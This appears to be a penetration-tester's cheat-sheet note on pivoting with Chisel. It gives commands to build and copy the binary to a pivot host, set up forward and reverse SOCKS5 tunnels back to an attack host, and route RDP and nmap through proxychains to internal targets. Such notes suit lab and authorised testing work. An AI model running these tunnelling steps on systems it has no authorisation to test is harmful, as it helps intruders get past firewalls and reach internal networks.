# SOCKS5 Tunneling with Chisel

Chisel = Go-based TCP/UDP tunnel over HTTP secured with SSH. Works where SSH direct tunneling is blocked — only needs HTTP/HTTPS outbound. Single binary, easy transfer.

---

## Forward Mode (pivot listens, attack host connects)

Build and transfer the binary:

```bash
git clone https://github.com/jpillora/chisel.git && cd chisel && go build
scp chisel <USER>@<PIVOT_IP>:~/
```

Start server on pivot:

```bash
./chisel server -v -p 1234 --socks5
```

Connect from attack host — creates SOCKS5 listener on `127.0.0.1:1080`:

```bash
./chisel client -v <PIVOT_IP>:1234 socks
```

Update `/etc/proxychains.conf`:

```
socks5  127.0.0.1 1080
```

---

## Reverse Mode (inbound blocked on pivot — attack host listens instead)

Use when firewall blocks inbound connections to the pivot but the pivot can initiate outbound to your attack host.

Start server on attack host with `--reverse`:

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Connect from pivot back to attack host with `R:socks`:

```bash
./chisel client -v <ATTACK_HOST_IP>:1234 R:socks
```

Same proxychains config: `socks5 127.0.0.1 1080`

---

Then use proxychains as normal:

```bash
proxychains xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS>
proxychains nmap -Pn -sT <TARGET_IP>
```

> [!tip] Chisel is the go-to when SSH `-D` isn't an option (no SSH on pivot, or port 22 is blocked). It only needs one outbound HTTP connection to work. Use prebuilt binaries from GitHub Releases if the Go build environment doesn't match the target's glibc version.

> [!warning] Default SOCKS port is 1080 (not 9050). Update proxychains.conf accordingly — easy to forget when switching between SSH tunnels and Chisel.